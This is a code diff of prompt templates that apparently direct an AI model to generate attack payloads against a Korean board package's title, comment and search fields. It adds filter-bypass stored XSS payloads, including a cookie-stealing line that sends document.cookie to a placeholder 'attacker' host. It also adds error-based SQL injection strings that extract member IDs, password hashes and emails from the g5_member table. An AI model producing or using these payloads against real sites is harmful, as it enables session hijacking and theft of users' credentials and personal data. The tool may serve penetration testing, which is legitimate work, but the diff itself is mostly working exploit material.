@@ -27,29 +27,42 @@ Reflection context: Stored in DB, later rendered as post title in:
   - Post detail page heading
   - Admin management page
 
-Known filter behavior:
-  - /bbs/ajax.filter.php pre-filters wr_subject before saving
-  - <script> tag is blocked/removed
-  - Some basic HTML tags (b, a, img, p) may be allowed
-  - Exact filter rules for title field are unclear - try diverse approaches
+Known filter behavior (from /bbs/ajax.filter.php analysis):
+  CONFIRMED BLOCKED:
+    - <script> tag: stripped entirely
+    - onfocus=, onclick= event handlers: removed by filter
+    - HTML entities for = (&#61;, &#x3D;): also filtered
+
+  LIKELY ALLOWED (standard HTML tags not in blocklist):
+    - <img src=x onerror=alert(1)>  - onerror on img not in blocklist
+    - <svg/onload=alert(1)>         - svg tag likely passes
+    - <a href=javascript:...>       - javascript: URI on a tag
+    - <details ontoggle=...>        - HTML5 interactive element
+
+  UNKNOWN (try these):
+    - <video>, <audio>, <marquee>, <iframe> tags
+    - CSS animation-based triggers
+    - Attribute encoding variants
 
 Generate {count} Stored XSS payloads for the wr_subject (title) field.
-Focus on these bypass strategies:
-1. HTML5 event handlers on tags that are NOT script: <img onerror>, <svg onload>, <details ontoggle>
-2. javascript: URI in href attribute: <a href="javascript:alert(1)">x</a>
-3. CSS-based: <style>*{"{"}color:red;animation-name:x{"}"}</style><p style="animation-name:x" onanimationstart=alert(1)>
-4. Filter bypass with HTML entities: <img src=x onerror&#61;alert(1)>
-5. Backtick function call (avoids parentheses if filtered): <img src=x onerror=alert`1`>
-6. Short polyglot: <svg/onload=alert(1)>, <body onload=alert(1)>
-7. Encoded tag names: <&#105;mg src=x onerror=alert(1)>
-8. Attribute without quotes: <img src=x onerror=alert(1) x=>
+DO NOT use: <script>, onfocus=, onclick=, &#61;
+FOCUS on:
+1. onerror/onload/onmouseover on non-script tags: <img onerror=alert(1)>, <svg/onload=alert(1)>
+2. javascript: URI: <a href="javascript:alert(1)">x</a>
+3. Backtick call: <img src=x onerror=alert`1`>
+4. HTML5 elements: <details open ontoggle=alert(1)>x</details>
+5. CSS animation: <p style="animation-name:x;animation-duration:1s" onanimationstart=alert(1)>x</p>
+6. Uncommon events: <img src=x onmouseover=alert(1)>, <body onpageshow=alert(1)>
+7. Encoded tag: <&#x69;mg src=x onerror=alert(1)>
 
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
 STORED_XSS | img_onerror | <img src=x onerror=alert(1)>
-STORED_XSS | svg_onload | <svg/onload=alert(1)>"""
+STORED_XSS | svg_onload | <svg/onload=alert(1)>
+STORED_XSS | a_javascript | <a href="javascript:alert(1)">x</a>
+STORED_XSS | details_ontoggle | <details open ontoggle=alert(1)>x</details>"""
 
 
 def build_xss_content(point: Dict[str, Any], count: int = 5) -> str:
@@ -182,27 +195,39 @@ CONFIRMED filter behavior:
   - URLs starting with http:// or https:// followed by valid domain → auto-converted to <a href="...">
   - javascript:alert(1) → NOT converted to link, rendered as plain text
   - incomplete URLs → rendered as plain text
-  - Script and other dangerous tags may be filtered
+  - onfocus=, onclick= event handlers: BLOCKED by filter (confirmed from search field tests)
+  - onmouseover= event handler: PASSES filter (confirmed working in search field tests)
 
 Strategy: The auto-link feature converts http:// URLs to <a href>
-Can we inject into the URL itself? For example:
-  - http://x.com" onmouseover="alert(1)
-  - http://x.com/ onclick=alert(1)//
-  If these get wrapped in <a href="http://x.com" onmouseover="alert(1)">, it works!
+Inject event handlers into the URL so the generated <a> tag carries the handler:
+  Input:  http://x.com" onmouseover="alert(1)
+  Output: <a href="http://x.com" onmouseover="alert(1)">http://x.com" onmouseover="alert(1)</a>
+  Result: mouseover triggers alert!
 
 Generate {count} Stored XSS payloads for comment content.
 Focus on:
-1. Inject into auto-linked URL: http://x" onmouseover="alert(1)
-2. Inject event into URL path: http://x.x/path onclick=alert(1)//
-3. Malformed URL that still gets linkified with attribute injection
-4. Direct HTML injection (if tags not fully filtered in comments)
-5. CSS injection via style tags if allowed
+1. URL attribute injection with onmouseover (confirmed working event):
+   http://x.com" onmouseover="alert(1)
+   http://x.x" onmouseover="alert`1`
+2. URL path injection with onmouseover:
+   http://x.x/path" onmouseover="alert(document.cookie)
+3. Other mouse events not in blocklist:
+   http://x.x" onmouseenter="alert(1)
+   http://x.x" onmouseleave="alert(1)
+4. Direct HTML injection (if comment tags not filtered):
+   <img src=x onerror=alert(1)>
+   <svg/onload=alert(1)>
+5. Cookie exfiltration variant:
+   http://x.x" onmouseover="fetch('http://attacker/?c='+document.cookie)
+
+DO NOT use: onclick=, onfocus= (these are filtered)
 
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
-STORED_XSS | url_attr_inject | http://x.x" onmouseover="alert(1)
+STORED_XSS | url_onmouseover | http://x.com" onmouseover="alert(1)
+STORED_XSS | url_onmouseenter | http://x.x" onmouseenter="alert(1)
 STORED_XSS | img_onerror | <img src=x onerror=alert(1)>"""
 
 
@@ -393,9 +418,17 @@ Attack techniques to cover:
 3. ERROR-BASED data extraction via EXTRACTVALUE (most reliable):
    a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))#
    a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,version())))#
+   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,user())))#
    a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()))))#
    a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/CONCAT(mb_id,0x3a,mb_password)/**/FROM/**/g5_member/**/LIMIT/**/1))))#
+   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/CONCAT(mb_id,0x3a,mb_password)/**/FROM/**/g5_member/**/LIMIT/**/1,1))))#
+   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/mb_email/**/FROM/**/g5_member/**/LIMIT/**/1))))#
    a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=0x67355f6d656d626572))))#
+
+   Hex values for common table names (use instead of quotes to avoid escaping):
+     g5_member  = 0x67355f6d656d626572
+     g5_admin   = 0x67355f61646d696e
+     g5_board   = 0x67355f626f617264
 
 4. TIME-BASED blind via SLEEP (use only if no errors triggered):
    a'))))AND(SLEEP(5))#
@@ -410,6 +443,8 @@ BOOLEAN | instr_false | a'))))AND(1=2)#
 ERROR_BASED | extract_db | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))#
 ERROR_BASED | extract_tables | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()))))#
 ERROR_BASED | extract_member | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/CONCAT(mb_id,0x3a,mb_password)/**/FROM/**/g5_member/**/LIMIT/**/1))))#
+ERROR_BASED | extract_member2 | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/CONCAT(mb_id,0x3a,mb_password)/**/FROM/**/g5_member/**/LIMIT/**/1,1))))#
+ERROR_BASED | extract_email | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/mb_email/**/FROM/**/g5_member/**/LIMIT/**/1))))#
 TIME_BASED | instr_sleep | a'))))AND(SLEEP(5))#"""
 
 
